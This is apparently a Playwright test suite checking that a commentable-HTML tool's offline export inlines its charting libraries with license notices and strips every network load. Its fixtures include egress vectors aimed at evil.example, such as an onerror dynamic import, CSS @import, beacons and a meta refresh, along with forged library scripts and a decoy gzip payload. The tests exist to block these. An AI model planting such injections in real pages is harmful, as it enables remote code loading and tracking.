import { test, expect } from "@playwright/test";
import { execFileSync } from "child_process";
import fs from "fs";
import path from "path";
import zlib from "zlib";
import {
  DEV, SKILL, PYTHON, fileUrl, ready, stageContent, startStaticServer,
  installClipboardCapture, openToolbarMenu, openSidebarExportMenu, addTextComment, readDownload, stageNonPortable,
  clickSidebarExport,
} from "./helpers.js";

const CONTENT = `
<h1>Offline export</h1>
<p id="offline-note">This paragraph proves embedded comments travel in the offline file.</p>
<img id="remoteTracker" alt="Remote tracker" src="https://example.com/tracker.png" srcset="https://example.com/tracker-2x.png 2x">
<iframe id="remoteFrame" title="Remote frame" src="https://example.com/beacon.html"></iframe>
<pre class="mermaid cm-skip">
flowchart LR
  A[Alpha] --> B[Beta]
</pre>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.5.1/dist/chart.umd.js"></script>
<figure class="chart" aria-labelledby="offline-chart-cap">
  <div class="chart-wrap cm-skip" style="position: relative; height: 180px; max-height: 180px; overflow: hidden;">
    <canvas id="offlineChart" width="360" height="180" role="img" aria-label="Offline export Chart.js bar chart"></canvas>
  </div>
  <figcaption id="offline-chart-cap">Chart.js chart for offline export.</figcaption>
</figure>
<script>
(function () {
  var el = document.getElementById("offlineChart");
  if (!el || typeof Chart === "undefined") return;
  new Chart(el, {
    type: "bar",
    data: {
      labels: ["one", "two", "three"],
      datasets: [{ label: "Values", data: [4, 9, 6], backgroundColor: "#4a7fb5" }]
    },
    options: {
      animation: false,
      responsive: false,
      plugins: { legend: { display: false } },
      scales: { y: { beginAtZero: true } }
    }
  });
})();
</script>
<script type="module">
import "https://example.com/bare-module.js";
</script>`;

async function routeRichContentLocal(page) {
  const mermaidRoot = path.join(DEV, "node_modules", "mermaid");
  const mermaidVersion = JSON.parse(fs.readFileSync(path.join(mermaidRoot, "package.json"), "utf8")).version;
  const chartRoot = path.join(DEV, "node_modules", "chart.js");
  await page.route(/^https?:\/\//, async (route) => {
    const url = route.request().url();
    if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
    const u = new URL(url);
    if (/cdn\.jsdelivr\.net\/npm\/mermaid@/.test(url)) {
      const reqMajor = (u.pathname.match(/mermaid@(\d+)/) || [])[1];
      if (reqMajor && reqMajor !== String(mermaidVersion).split(".")[0]) {
        throw new Error(`mermaid version mismatch: template requests @${reqMajor}, vendored is ${mermaidVersion}`);
      }
      const rel = u.pathname.replace(/^\/npm\/mermaid@[^/]+\//, "");
      try {
        const body = fs.readFileSync(path.join(mermaidRoot, rel));
        return route.fulfill({ body, contentType: "text/javascript", headers: { "access-control-allow-origin": "*" } });
      } catch (e) {
        return route.abort();
      }
    }
    if (/cdn\.jsdelivr\.net\/npm\/chart\.js@/.test(url)) {
      const body = fs.readFileSync(path.join(chartRoot, "dist", "chart.umd.js"));
      return route.fulfill({ body, contentType: "text/javascript", headers: { "access-control-allow-origin": "*" } });
    }
    return route.abort();
  });
}

function makeTmpDir() {
  const repoRoot = path.resolve(DEV, "..", "..", "..");
  const tmpRoot = path.join(repoRoot, "tmp");
  fs.mkdirSync(tmpRoot, { recursive: true });
  return fs.mkdtempSync(path.join(tmpRoot, "cmh_offline_"));
}

async function installDownloadTextCapture(page) {
  await page.addInitScript(() => {
    window.__cmhDownloadTexts = [];
    const originalCreateObjectURL = URL.createObjectURL.bind(URL);
    URL.createObjectURL = (blob) => {
      if (blob && String(blob.type || "").includes("text/html")) {
        blob.text().then((text) => window.__cmhDownloadTexts.push(text));
      }
      return originalCreateObjectURL(blob);
    };
  });
}

async function capturedDownloadText(page) {
  await page.waitForFunction(() => window.__cmhDownloadTexts && window.__cmhDownloadTexts.length > 0);
  return page.evaluate(() => window.__cmhDownloadTexts[window.__cmhDownloadTexts.length - 1]);
}

function layerDescriptor(html) {
  const m = html.match(/<script\b[^>]*\sid\s*=\s*(["'])commentableHtmlLayer\1[^>]*>([\s\S]*?)<\/script>/i);
  if (!m) throw new Error("missing layer descriptor");
  return JSON.parse(m[2]);
}

function realLayerDescriptorScripts(html) {
  const head = html.slice(0, html.indexOf(CONTENT_BEGIN));
  return [...head.matchAll(/<script\b[^>]*\sid\s*=\s*(["'])commentableHtmlLayer\1[^>]*>([\s\S]*?)<\/script>/gi)];
}

function insertLayerDecoy(html) {
  const decoy = '<script type="application/json" data-id="commentableHtmlLayer">{"decoy":"keep"}</script>';
  const marker = '<script type="application/json" id="commentableHtmlLayer">';
  if (!html.includes(marker)) throw new Error("missing real layer descriptor marker");
  return html.replace(marker, decoy + "\n" + marker);
}

const EXPECTED_LAYER_REGIONS = ["CSS", "HANDLED IDS", "EMBEDDED COMMENTS", "COMMENT UI", "JS"];
const CONTENT_BEGIN = "<!-- BEGIN: commentable-html - CONTENT (agent edits ONLY between these markers) -->";
const CONTENT_END = "<!-- END: commentable-html - CONTENT -->";

function escapeRegExp(s) {
  return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

function markerLine(kind, region) {
  return new RegExp(
    `^[ \\t]*(?:<!--[ \\t]*)?(?:/\\*[ \\t]*)?(?:=+[ \\t]*)?${
      escapeRegExp(`${kind}: commentable-html - ${region}`)
    }[ \\t]*(?:=+[ \\t]*)?(?:-->|\\*/)?[ \\t]*$`,
    "gm"
  );
}

function expectForwardCompatibleContract(html, mode) {
  const descriptor = layerDescriptor(html);
  expect(descriptor.mode).toBe(mode);
  expect(descriptor.regions).toEqual(EXPECTED_LAYER_REGIONS);

  let lastBegin = -1;
  for (const region of EXPECTED_LAYER_REGIONS) {
    const begins = [...html.matchAll(markerLine("BEGIN", region))];
    const ends = [...html.matchAll(markerLine("END", region))];
    expect(begins, `BEGIN marker for ${region}`).toHaveLength(1);
    expect(ends, `END marker for ${region}`).toHaveLength(1);
    expect(begins[0].index).toBeLessThan(ends[0].index);
    expect(begins[0].index).toBeGreaterThan(lastBegin);
    lastBegin = begins[0].index;
  }

  const begin = html.indexOf(CONTENT_BEGIN);
  const end = html.indexOf(CONTENT_END);
  expect(begin).toBeGreaterThan(-1);
  expect(end).toBeGreaterThan(begin);
  const beforeContent = html.slice(0, begin);
  const rootMatches = [...beforeContent.matchAll(/<main\b[^>]*\bid=(["'])commentRoot\1[^>]*>/gi)];
  expect(rootMatches).toHaveLength(1);
  expect(rootMatches[0][0]).toContain("data-cmh-content-root");
  expect(html.indexOf("</main>", end)).toBeGreaterThan(end);
}

function mediaLoadAttributes(html) {
  const refs = [];
  const tagRe = /<(script|link|img|source|iframe|video|audio|object|embed|track|image|use|input|meta|body|table|td|th|form|button)\b[^>]*>/gi;
  for (const tag of html.matchAll(tagRe)) {
    for (const attr of tag[0].matchAll(/\s(href|xlink:href|src|srcset|poster|data|background|content|action|formaction)\s*=\s*["']([^"']+)["']/gi)) {
      refs.push({ tag: tag[1].toLowerCase(), attr: attr[1].toLowerCase(), value: attr[2] });
    }
  }
  return refs;
}

function networkLoadRefs(html) {
  const refs = [];
  for (const item of mediaLoadAttributes(html)) {
    const values = item.attr === "srcset" ? item.value.split(",").map((part) => part.trim().split(/\s+/)[0]) : [item.value];
    for (const value of values) {
      if (/^(?:https?:)?\/\//i.test(value)) refs.push(value);
    }
  }
  return refs;
}

function cspMetaContent(html) {
  const m = html.match(/<meta\b[^>]*http-equiv=["']Content-Security-Policy["'][^>]*>/i);
  if (!m) return "";
  const c = m[0].match(/\scontent=(["'])([\s\S]*?)\1/i);
  return c ? c[2] : "";
}

test("Export Offline embeds vendored mermaid and Chart.js for zero-network reopen (CMH-OFFLINE-01, CMH-OFFLINE-02)", async ({ page, browser }) => {
  test.setTimeout(60000);
  expect(networkLoadRefs(CONTENT)).toEqual(expect.arrayContaining([
    "https://example.com/tracker.png",
    "https://example.com/tracker-2x.png",
    "https://example.com/beacon.html",
  ]));
  const staged = stageContent(CONTENT, { key: "cmh-offline-export", source: "offline-export.html" });
  fs.writeFileSync(staged.html, insertLayerDecoy(fs.readFileSync(staged.html, "utf8")));
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await routeRichContentLocal(page);
    await installClipboardCapture(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await page.waitForFunction(() => !!document.querySelector("#commentRoot pre.mermaid svg"), null, { timeout: 20000 });
    await page.waitForFunction(() => !!(window.Chart && window.Chart.getChart && window.Chart.getChart("offlineChart")), null, { timeout: 20000 });

    await openToolbarMenu(page);
    await expect(page.locator("#btnExportOfflineTop")).toBeVisible();
    await page.keyboard.press("Escape");
    await addTextComment(page, "#offline-note", "offline note with import('https://evil.example/x.js') survives");
    await expect(page.locator("#btnSidebarExportMenu")).toBeVisible();
    await openSidebarExportMenu(page);
    await expect(page.locator("#btnExportOffline")).toBeVisible();

    const [download] = await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnExportOffline"),
    ]);
    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    expectForwardCompatibleContract(exportedHtml, "offline");
    expect(realLayerDescriptorScripts(exportedHtml)).toHaveLength(1);
    expect(exportedHtml).toContain('<script type="application/json" data-id="commentableHtmlLayer">{"decoy":"keep"}</script>');
    expect(exportedHtml).toContain('id="embeddedComments"');
    expect(exportedHtml).toContain('<canvas id="offlineChart"');
    expect(exportedHtml).not.toContain('data-cm-offline-chart="true"');
    expect(exportedHtml).not.toContain('<img id="offlineChart"');
    expect(exportedHtml).not.toContain("cdn.jsdelivr.net/npm/mermaid");
    expect(exportedHtml).not.toContain("cdn.jsdelivr.net/npm/chart.js");
    expect(exportedHtml).not.toContain("bare-module.js");
    expect(networkLoadRefs(exportedHtml)).toEqual([]);

    const exportedPath = path.join(outDir, "offline-export.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext({ offline: true });
    const page2 = await ctx2.newPage();
    const external = [];
    page2.on("request", (request) => {
      if (/^https?:\/\//.test(request.url())) external.push(request.url());
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    await expect(page2.locator("#cmTypeBadge")).toHaveText("Offline");
    await expect(page2.locator("#cmTypeBadge")).toHaveAttribute("aria-live", "polite");
    await expect(page2.locator("#cmTypeBadge")).toHaveAttribute("aria-label", /Offline: self-contained and works with no network/);
    await expect(page2.locator("#commentList")).toContainText("offline note with import('https://evil.example/x.js') survives");

    const mediaState = await page2.evaluate(() => {
      const img = document.getElementById("remoteTracker");
      const iframe = document.getElementById("remoteFrame");
      return {
        imgSrc: img && img.getAttribute("src"),
        imgSrcset: img && img.getAttribute("srcset"),
        iframeSrc: iframe && iframe.getAttribute("src"),
      };
    });
    expect(mediaState.imgSrc || "").not.toMatch(/^(?:https?:)?\/\//i);
    expect(mediaState.imgSrcset).toBeNull();
    expect(mediaState.iframeSrc).toBeNull();

    const mermaid = page2.locator("#commentRoot pre.mermaid svg").first();
    await expect(mermaid).toBeVisible();
    await page2.locator("#commentRoot pre.mermaid svg g.node").first().hover();
    await expect(page2.locator("#mermaidAddBtn")).toBeVisible();

    const chart = page2.locator("canvas#offlineChart");
    await expect(chart).toBeVisible();
    const chartMetrics = await page2.evaluate(() => {
      const canvas = document.getElementById("offlineChart");
      const chart = window.Chart && window.Chart.getChart && window.Chart.getChart("offlineChart");
      if (!canvas || !chart) return null;
      const rect = canvas.getBoundingClientRect();
      const active = [{ datasetIndex: 0, index: 1 }];
      if (chart.setActiveElements) chart.setActiveElements(active);
      if (chart.tooltip && chart.tooltip.setActiveElements) {
        chart.tooltip.setActiveElements(active, {
          x: rect.left + rect.width / 2,
          y: rect.top + 20,
        });
      }
      chart.update("none");
      return {
        width: rect.width,
        height: rect.height,
        tooltipOpacity: chart.tooltip && typeof chart.tooltip.opacity === "number" ? chart.tooltip.opacity : 0,
        datasets: chart.data && chart.data.datasets ? chart.data.datasets.length : 0,
        chartAreaWidth: chart.chartArea ? chart.chartArea.right - chart.chartArea.left : 0,
      };
    });
    expect(chartMetrics).toBeTruthy();
    expect(chartMetrics.datasets).toBe(1);
    expect(chartMetrics.width).toBeGreaterThan(20);
    expect(chartMetrics.height).toBeGreaterThan(20);
    expect(chartMetrics.chartAreaWidth).toBeGreaterThan(20);
    expect(chartMetrics.tooltipOpacity).toBeGreaterThan(0);
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("Export Offline embeds the MIT license notice beside each inlined library (CMH-LICENSE-02)", async ({ page }) => {
  test.setTimeout(90000);
  const staged = stageContent(CONTENT, { key: "cmh-offline-notice", source: "offline-notice.html" });
  // Seed a STALE library notice into the document head on disk (as a hypothetical earlier offline
  // pass would leave). The offline export's base HTML carries it, so this exercises the idempotency
  // strip: _stripOfflineRichRenderers must drop the stale notice before the export re-emits one.
  const staleNotice = "<!-- Third-party notice - mermaid is bundled inline for offline use under the MIT License:\nSTALE DUPLICATE\n-->";
  fs.writeFileSync(staged.html, fs.readFileSync(staged.html, "utf8").replace("</head>", staleNotice + "\n</head>"));
  const server = await startStaticServer(staged.dir);
  try {
    await routeRichContentLocal(page);
    await installClipboardCapture(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await addTextComment(page, "#offline-note", "notice check");
    await openSidebarExportMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnExportOffline"),
    ]);
    const exportedHtml = await capturedDownloadText(page);
    // Both libraries are inlined for this doc, so both MIT notices must travel with them, each inside
    // an HTML comment (a notice, not executable content) that carries the verbatim upstream copyright.
    const comments = [...exportedHtml.matchAll(/<!--([\s\S]*?)-->/g)].map((m) => m[1]);
    const mermaidNotice = comments.find((c) => c.includes("Third-party notice - mermaid"));
    const chartNotice = comments.find((c) => c.includes("Third-party notice - Chart.js"));
    expect(mermaidNotice, "mermaid MIT notice comment").toBeTruthy();
    expect(chartNotice, "Chart.js MIT notice comment").toBeTruthy();
    expect(mermaidNotice).toContain("Copyright (c) 2014 - 2022 Knut Sveidqvist");
    expect(mermaidNotice).toContain("Permission is hereby granted");
    expect(chartNotice).toContain("Copyright (c) 2014-2024 Chart.js Contributors");
    expect(chartNotice).toContain("Permission is hereby granted");
    // Idempotent: exactly one notice per library - the seeded stale mermaid notice was stripped and
    // re-emitted once, never duplicated.
    expect((exportedHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
    expect((exportedHtml.match(/Third-party notice - Chart\.js/g) || []).length).toBe(1);
    expect(exportedHtml).not.toContain("STALE DUPLICATE");
    // The notice is a comment, never an executed script, so it cannot run and stays under the CSP.
    expect(exportedHtml).not.toContain("Third-party notice - mermaid is bundled inline for offline use under the MIT License:</script>");
  } finally {
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

// CMH-OFFLINE-07: an offline file no longer carries the vendored cmhVendoredRichLibs payload (the
// first export strips it once the libraries are inlined), so a SECOND Export Offline run on that file
// has nothing to re-inline from. It must carry the copies that are already there - local, already
// inlined - rather than stripping them and failing with "missing the vendored mermaid bundle".
test("CMH-OFFLINE-07: re-exporting an already-offline document carries its inlined libraries", async ({ page, browser }) => {
  test.setTimeout(150000);
  const staged = stageContent(CONTENT, { key: "cmh-offline-reexport", source: "offline-reexport.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  let ctx3;
  try {
    await routeRichContentLocal(page);
    await installClipboardCapture(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await page.waitForFunction(() => !!document.querySelector("#commentRoot pre.mermaid svg"), null, { timeout: 20000 });
    await page.waitForFunction(() => !!(window.Chart && window.Chart.getChart && window.Chart.getChart("offlineChart")), null, { timeout: 20000 });
    await addTextComment(page, "#offline-note", "re-export keeps its libraries");
    await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnExportOffline"),
    ]);
    const firstHtml = await capturedDownloadText(page);
    // Premise of the bug: the first pass inlines both libraries and CONSUMES the vendored payload.
    expect(firstHtml).toContain('data-cmh-offline-lib="mermaid"');
    expect(firstHtml).toContain('data-cmh-offline-lib="chartjs"');
    expect(firstHtml).not.toContain('id="cmhVendoredRichLibs"');
    const firstPath = path.join(outDir, "offline-1.html");
    fs.writeFileSync(firstPath, firstHtml);

    // Re-export that offline file, with no network at all - the libraries it needs are already in it.
    ctx2 = await browser.newContext({ offline: true });
    const page2 = await ctx2.newPage();
    const externalOnReexport = [];
    page2.on("request", (request) => {
      if (/^https?:\/\//.test(request.url())) externalOnReexport.push(request.url());
    });
    await installClipboardCapture(page2);
    await installDownloadTextCapture(page2);
    await page2.goto(fileUrl(firstPath));
    await ready(page2);
    await Promise.all([
      page2.waitForEvent("download"),
      clickSidebarExport(page2, "#btnExportOffline"),
    ]);
    const secondHtml = await capturedDownloadText(page2);
    await expect(page2.locator("#toast")).not.toContainText("vendored");
    expect(externalOnReexport).toEqual([]);

    // Exactly one copy of each library and of each MIT notice - carried over, never duplicated.
    expect((secondHtml.match(/data-cmh-offline-lib="mermaid"/g) || []).length).toBe(1);
    expect((secondHtml.match(/data-cmh-offline-lib="chartjs"/g) || []).length).toBe(1);
    expect((secondHtml.match(/data-cmh-offline-lib-init="mermaid"/g) || []).length).toBe(1);
    expect((secondHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
    expect((secondHtml.match(/Third-party notice - Chart\.js/g) || []).length).toBe(1);
    expect(secondHtml).toContain("Copyright (c) 2014 - 2022 Knut Sveidqvist");
    expect(secondHtml).toContain("Copyright (c) 2014-2024 Chart.js Contributors");
    expect(networkLoadRefs(secondHtml)).toEqual([]);

    const secondPath = path.join(outDir, "offline-2.html");
    fs.writeFileSync(secondPath, secondHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", secondPath], { cwd: SKILL, stdio: "pipe" });

    // The twice-exported file still renders its diagram and its chart with zero network.
    ctx3 = await browser.newContext({ offline: true });
    const page3 = await ctx3.newPage();
    const external = [];
    page3.on("request", (request) => {
      if (/^https?:\/\//.test(request.url())) external.push(request.url());
    });
    await page3.goto(fileUrl(secondPath));
    await ready(page3);
    await expect(page3.locator("#cmTypeBadge")).toHaveText("Offline");
    await expect(page3.locator("#commentRoot pre.mermaid svg").first()).toBeVisible();
    await expect(page3.locator("canvas#offlineChart")).toBeVisible();
    const drawn = await page3.evaluate(() => !!(window.Chart && window.Chart.getChart && window.Chart.getChart("offlineChart")));
    expect(drawn).toBe(true);
    expect(external).toEqual([]);
  } finally {
    if (ctx3) await ctx3.close();
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

// The carried copy is a LAST RESORT, never a preferred source: an inlined-library script is just
// markup in a document anyone may have edited, so the skill's own vendored payload wins whenever it
// is present, and a carried library travels only WITH its MIT notice.
test("CMH-OFFLINE-07: a document-supplied inlined-library script never beats the vendored payload", async ({ page }) => {
  test.setTimeout(90000);
  const staged = stageContent(CONTENT, { key: "cmh-offline-forged-lib", source: "offline-forged-lib.html" });
  // Inject a forged copy of BOTH markers, as an attacker editing an online document would. The
  // vendored payload is still present here, so the export must use it and ignore these bodies.
  const forged = '<script data-cmh-offline-lib="mermaid">window.__cmhForgedLib = "mermaid";</script>\n'
    + '<script data-cmh-offline-lib="chartjs">window.__cmhForgedLib = "chartjs";</script>\n'
    + '<!-- Third-party notice - mermaid is bundled inline for offline use under the MIT License:\nFORGED NOTICE\n-->\n';
  fs.writeFileSync(staged.html, fs.readFileSync(staged.html, "utf8").replace("</head>", forged + "</head>"));
  const server = await startStaticServer(staged.dir);
  try {
    await routeRichContentLocal(page);
    await installClipboardCapture(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await addTextComment(page, "#offline-note", "forged library check");
    await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnExportOffline"),
    ]);
    const exportedHtml = await capturedDownloadText(page);
    expect(exportedHtml).not.toContain("__cmhForgedLib");
    expect(exportedHtml).not.toContain("FORGED NOTICE");
    expect((exportedHtml.match(/data-cmh-offline-lib="mermaid"/g) || []).length).toBe(1);
    expect((exportedHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
    expect(exportedHtml).toContain("Copyright (c) 2014 - 2022 Knut Sveidqvist");
  } finally {
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

test("CMH-OFFLINE-07: a carried library with no MIT notice is refused rather than shipped bare", async ({ page, browser }) => {
  test.setTimeout(120000);
  const staged = stageContent(CONTENT, { key: "cmh-offline-noticeless", source: "offline-noticeless.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await routeRichContentLocal(page);
    await installClipboardCapture(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await page.waitForFunction(() => !!document.querySelector("#commentRoot pre.mermaid svg"), null, { timeout: 20000 });
    await addTextComment(page, "#offline-note", "noticeless check");
    await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnExportOffline"),
    ]);
    // Strip the mermaid MIT notice from the offline file, leaving its inlined library behind. MIT
    // requires the notice to accompany the copy, so that library must not be carried; with the
    // payload already consumed there is nothing to fall back to, and the export must fail loudly.
    const stripped = (await capturedDownloadText(page))
      .replace(/<!--\s*Third-party notice - mermaid[\s\S]*?-->/, "");
    expect(stripped).toContain('data-cmh-offline-lib="mermaid"');
    expect(stripped).not.toContain("Third-party notice - mermaid");
    const strippedPath = path.join(outDir, "offline-noticeless.html");
    fs.writeFileSync(strippedPath, stripped);

    ctx2 = await browser.newContext({ offline: true });
    const page2 = await ctx2.newPage();
    let downloaded = false;
    page2.on("download", () => { downloaded = true; });
    await installClipboardCapture(page2);
    await page2.goto(fileUrl(strippedPath));
    await ready(page2);
    await clickSidebarExport(page2, "#btnExportOffline");
    await expect(page2.locator("#toast")).toContainText("no MIT notice");
    expect(downloaded).toBe(false);
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("CMH-OFFLINE-07: an authored decoy vendored payload inside the content is ignored", async ({ page }) => {
  test.setTimeout(90000);
  // Reproduce the FINALIZED shape: the authoring tool places the real payload just before </body>,
  // after #commentRoot. getElementById returns the first match in document order, so a decoy
  // carrying the same id inside the authored content would otherwise win - and its gzipped bytes
  // would be inlined into an export whose own CSP allows inline script.
  const forgedPayload = JSON.stringify({
    encoding: "gzip+base64",
    mermaidGzipBase64: zlib.gzipSync(Buffer.from('window.__cmhForgedPayload = "mermaid";')).toString("base64"),
    chartjsGzipBase64: zlib.gzipSync(Buffer.from('window.__cmhForgedPayload = "chartjs";')).toString("base64"),
    mermaidLicense: "FORGED PAYLOAD NOTICE",
    chartjsLicense: "FORGED PAYLOAD NOTICE",
  });
  const decoy = '<script type="application/json" id="cmhVendoredRichLibs">' + forgedPayload + "</script>\n";
  const staged = stageContent(decoy + CONTENT, { key: "cmh-offline-decoy", source: "offline-decoy.html" });
  let html = fs.readFileSync(staged.html, "utf8");
  const realPayload = /<script\b[^>]*\sid="cmhVendoredRichLibs"[^>]*>[\s\S]*?<\/script>\s*/;
  const realMatch = html.match(realPayload);
  expect(realMatch, "fixture premise: the template carries the real payload").toBeTruthy();
  html = html.replace(realPayload, "");
  const bodyEnd = html.lastIndexOf("</body>");
  expect(bodyEnd).toBeGreaterThan(0);
  html = html.slice(0, bodyEnd) + realMatch[0] + html.slice(bodyEnd);
  const decoyAt = html.indexOf('id="cmhVendoredRichLibs"');
  const realAt = html.lastIndexOf('id="cmhVendoredRichLibs"');
  expect(html.indexOf('id="commentRoot"')).toBeLessThan(decoyAt);
  expect(decoyAt).toBeLessThan(realAt);
  fs.writeFileSync(staged.html, html);
  const server = await startStaticServer(staged.dir);
  try {
    await routeRichContentLocal(page);
    await installClipboardCapture(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await addTextComment(page, "#offline-note", "decoy payload check");
    await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnExportOffline"),
    ]);
    const exportedHtml = await capturedDownloadText(page);
    expect(exportedHtml).not.toContain("__cmhForgedPayload");
    // The decoy's own text can legitimately survive as authored content (and as a comment anchor's
    // context), so assert on what was USED: the emitted notices must be the vendored ones.
    const notices = [...exportedHtml.matchAll(/<!--([\s\S]*?)-->/g)]
      .map((m) => m[1]).filter((c) => c.includes("Third-party notice - "));
    expect(notices).toHaveLength(2);
    notices.forEach((n) => expect(n).not.toContain("FORGED PAYLOAD NOTICE"));
    expect(exportedHtml).toContain("Copyright (c) 2014 - 2022 Knut Sveidqvist");
    // No payload block survives the export - neither the genuine one nor the decoy.
    expect(exportedHtml).not.toContain('id="cmhVendoredRichLibs"');
  } finally {
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

test("editing an already-offline document preserves offline mode and offline export is idempotent (CMH-OFFLINE-03)", async ({ page }) => {
  const offlineContent = `
<h1>Already offline</h1>
<p id="offline-preserve-note">Offline files can still collect review notes.</p>
<figure class="chart">
  <div class="chart-wrap cm-skip">
    <img id="offlinePreservedChart" class="cmh-chart" data-cm-offline-chart="true"
      src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAFgwJ/l1pK4wAAAABJRU5ErkJggg=="
      alt="Offline chart snapshot" width="1" height="1">
  </div>
  <figcaption>Offline chart snapshot.</figcaption>
</figure>`;
  const staged = stageContent(offlineContent, { key: "cmh-offline-preserve", source: "offline-preserve.html" });
  const html = fs.readFileSync(staged.html, "utf8")
    .replace('"mode":"portable"', '"mode":"offline"', 1);
  fs.writeFileSync(staged.html, html);
  try {
    await installClipboardCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await expect(page.locator("#cmTypeBadge")).toHaveText("Offline");
    await addTextComment(page, "#offline-preserve-note", "preserve this offline note");

    const [portableDownload] = await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnSaveHtml"),
    ]);
    const portableHtml = await readDownload(portableDownload);
    expect(layerDescriptor(portableHtml).mode).toBe("offline");
    expect(portableHtml).toContain("preserve this offline note");
    expect(portableHtml).toContain('data-cm-offline-chart="true"');
    expect(mediaLoadAttributes(portableHtml).length).toBeGreaterThan(0);
    expect(networkLoadRefs(portableHtml)).toEqual([]);

    const [offlineDownload] = await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnExportOffline"),
    ]);
    const offlineHtml = await readDownload(offlineDownload);
    expect(layerDescriptor(offlineHtml).mode).toBe("offline");
    expect((offlineHtml.match(/data-cm-offline-chart="true"/g) || []).length).toBe(1);
    expect(mediaLoadAttributes(offlineHtml).length).toBeGreaterThan(0);
    expect(networkLoadRefs(offlineHtml)).toEqual([]);
    expect(offlineHtml).not.toContain('<canvas id="offlinePreservedChart"');
    expect(offlineHtml).toContain("preserve this offline note");
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

test("Export Offline adds a zero-network CSP and strips loader, media, CSS, and event-handler egress (CMH-OFFLINE-04, CMH-OFFLINE-05)", async ({ page, browser }) => {
  const CONTENT_WITH_EGRESS = `
<h1>Offline zero network</h1>
<style>
@import "https://evil.example/imported.css";
.remote-bg { background-image: url("//evil.example/bg.png"); }
</style>
<link rel="prefetch" href="https://evil.example/prefetch.js">
<link rel="prerender" href="https://evil.example/prerender.html">
<meta http-equiv="refresh" content="9999; url=https://evil.example/refresh">
<p id="egress-note">Offline export must strip every load vector.</p>
<img id="sameOriginBeacon" alt="same origin beacon" src="__SAME_ORIGIN__/same-origin.png">
<img id="handlerProbe" alt="handler probe" src="data:image/gif;base64,AA" onerror="import('https://evil.example/onerror.js')">
<svg width="20" height="20" aria-label="remote svg refs">
  <image href="https://evil.example/vector.png" width="20" height="20"></image>
  <use href="https://evil.example/sprite.svg#icon"></use>
  <image xlink:href="https://evil.example/vector-xlink.png" width="20" height="20"></image>
  <use xlink:href="https://evil.example/sprite-xlink.svg#icon"></use>
</svg>
<video poster="https://evil.example/poster.png"><track src="https://evil.example/captions.vtt"></video>
<video src="https://evil.example/video.mp4"><source src="https://evil.example/video-source.mp4" srcset="https://evil.example/video-2x.png 2x"></video>
<audio src="https://evil.example/audio.mp3"><source src="https://evil.example/audio-source.ogg"></audio>
<input type="image" alt="submit" src="https://evil.example/input.png">
<div background="https://evil.example/background.png">legacy background</div>
<script>const u = "https://evil.example/dynamic-import.js"; import(u);</script>`;
  const staged = stageContent(CONTENT_WITH_EGRESS, { key: "cmh-offline-zero-network", source: "offline-zero.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    fs.writeFileSync(path.join(staged.dir, "same-origin.png"), Buffer.from("not a real image"));
    fs.writeFileSync(staged.html, fs.readFileSync(staged.html, "utf8").replace(/__SAME_ORIGIN__/g, server.url));
    await page.route(/^https?:\/\//, async (route) => {
      const url = route.request().url();
      if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
      return route.abort();
    });
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await openToolbarMenu(page);

    const [download] = await Promise.all([
      page.waitForEvent("download"),
